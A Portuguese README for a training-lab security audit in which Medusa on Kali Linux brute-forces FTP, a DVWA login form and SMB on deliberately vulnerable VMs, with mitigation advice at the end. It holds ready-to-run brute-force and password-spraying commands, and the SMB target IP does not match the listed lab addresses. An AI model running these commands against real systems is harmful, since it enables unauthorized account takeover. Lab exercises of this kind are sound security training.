# Auditoria de Segurança com Kali Linux e Medusa

## Introdução
Este projeto foi desenvolvido como parte do desafio da DIO para aplicar conceitos de segurança ofensiva em ambientes controlados.  
O objetivo é simular ataques de força bruta utilizando **Kali Linux** e a ferramenta **Medusa**, explorando serviços vulneráveis como **FTP**, **DVWA (Web)** e **SMB**, e documentar recomendações de mitigação.

---

## Configuração do Ambiente
- VirtualBox com duas VMs:
  - Kali Linux (atacante)
  - Metasploitable 2 e DVWA (alvos)
- Rede interna (Host-only) para comunicação entre as máquinas.
- IPs utilizados:
  - Kali Linux → `192.168.56.100`
  - Metasploitable 2 → `192.168.56.101`
  - DVWA → `192.168.56.102`

---

## Ferramentas Utilizadas
- Kali Linux
- Medusa
- DVWA (Damn Vulnerable Web Application)
- Wordlists personalizadas

---

## Cenários de Teste
**Objetivo**: validar credenciais fracas no serviço FTP.
**Resultado esperado:** acesso obtido com senha simples.

1. Ataque de Força Bruta em FTP

```bash
medusa -h 192.168.56.101 -u admin -P wordlist.txt -M ftp
```

**2. Automação em Formulário Web (DVWA)**
```bash
medusa -h 192.168.56.102 -u admin -P wordlist.txt -M http \
-m FORM:/dvwa/login.php:username=^USER^&password=^PASS^:F=Login failed
```

**3. Password Spraying em SMB**
```bash
medusa -h 192.168.56.103 -U users.txt -P passwords.txt -M smbnt
```

**## Recomendações de Mitigação**
- Uso de senhas fortes e políticas de complexidade.
- Implementação de bloqueio de conta após falhas consecutivas.
- Monitoramento de logs e alertas de segurança.
- Segmentação e restrição de serviços vulneráveis.
